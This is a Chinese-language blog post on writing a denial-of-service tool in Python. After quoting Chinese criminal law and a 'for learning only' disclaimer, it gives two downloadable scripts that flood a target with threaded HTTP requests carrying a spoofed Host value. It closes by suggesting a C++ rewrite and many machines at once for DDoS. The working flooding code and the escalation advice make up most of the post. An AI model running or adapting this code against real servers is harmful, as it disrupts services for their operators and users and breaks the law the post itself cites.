---
title: Python实现DoS攻击
toc: true
date: 2021-08-03 11:06:55
categories: Coding
tags:
    - Python
    - Socket
---

# 引子

**一切开发旨在学习，请勿用于非法用途**

<!-- more -->

> **《中华人民共和国刑法》第二百八十六条 破坏计算机信息系统罪**：  
> 违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行  
> 后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。  
> 违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，果严重的，依照前款的规定处罚。  
> 故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。  
> 单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。  

另：

> 在中华人民共和国最高人民法院与最高人民检察院 **《关于办理危害计算机信息系统安全刑事案件应用法律若干问题的解释》** 中，对破坏计算机信息系统的适用进行了明确：  
> 破坏计算机信息系统功能、数据或者应用程序，具有下列情形之一的，应当认定为刑法第二百八十六条第一款和第二款规定的“后果严重”：  
> （一）造成十台以上计算机信息系统的主要软件或者硬件不能正常运行的；  
> （二）对二十台以上计算机信息系统中存储、处理或者传输的数据进行删除、修改、增加操作的；  
> （三）违法所得五千元以上或者造成经济损失一万元以上的；  
> （四）造成为一百台以上计算机信息系统提供域名解析、身份认证、计费等基础服务或者为一万以上用户
> 供服务的计算机信息系统不能正常运行累计一小时以上的；  
> （五）造成其他严重后果的。  
> 实施前款规定行为，具有下列情形之一的，应当认定为破坏计算机信息系统“后果特别严重”：  
> （一）数量或者数额达到前款第（一）项至第（三）项规定标准五倍以上的；  
> （二）造成为五百台以上计算机信息系统提供域名解析、身份认证、计费等基础服务或者为五万以上用户
> 供服务的计算机信息系统不能正常运行累计一小时以上的；  
> （三）破坏国家机关或者金融、电信、交通、教育、医疗、能源等领域提供公共服务的计算机信息系统的
> 能、数据或者应用程序，致使生产、生活受到严重影响或者造成恶劣社会影响的；  
> （四）造成其他特别严重后果的。

**一切开发旨在学习，请勿用于非法用途**

# 通信原理

`socket`模拟客户端向目标服务器不断发送空请求。  
使用`threading`增加请求量，起到攻击的效果。

# 无计数版

显然，无计数版的攻击周期更短，但无法了解已经发出了多少请求。

[<i class="fas fa-download"></i>](dossilent.py) `下载dossilent.py` 下方的代码。

``` python Python 3
# 一切开发旨在学习，请勿用于非法用途

import socket
import threading

# 确认攻击目标
target = '127.0.0.1' # 攻击目标的 IP 地址
fake_ip = '223.30.81.143' # 随机生成的 IP 地址，用于伪装
port = 80 # 攻击目标的端口

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port)) # 连接至服务器
        # 发送空请求
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        # 断开连接
        s.close()

for i in range(1): # 将 1 替换为你需要的线程数量
    thread = threading.Thread(target=attack)
    thread.start()
```

# 计数版

[<i class="fas fa-download"></i>](dos.py) `下载dos.py` 下方的代码。

``` python Python 3
# 一切开发旨在学习，请勿用于非法用途

import socket
import threading

# 确认攻击目标
target = '127.0.0.1' # 攻击目标的 IP 地址
fake_ip = '223.30.81.143' # 随机生成的 IP 地址，用于伪装
port = 80 # 攻击目标的端口

# 计数
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port)) # 连接至服务器
        # 发送空请求
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        # 计数模块
        global attack_num
        attack_num += 1
        print(attack_num)
        
        # 断开连接
        s.close()

for i in range(1): # 将 1 替换为你需要的线程数量
    thread = threading.Thread(target=attack)
    thread.start()
```

# 后话

由于Python拉跨的效率，实际上此处提供的程序仅能增加访问延迟，而不至于将服务器攻击崩溃。  
此处仅提供类似流程，若有能力可用其它高效率的语言（如`C++`）进行重写。  
DDoS与此相近，只需用大量的计算机同时向单一目标计算机发起DoS攻击即可。  
这东西玩玩就好了，打打自己的服务器看看效果就可以了，别太较真，高强度的DoS或DDoS攻击是违法的。  
拓展：[知乎：应对DDoS攻击的法律武器](https://zhuanlan.zhihu.com/p/109918158)
**一切开发旨在学习，请勿用于非法用途。**
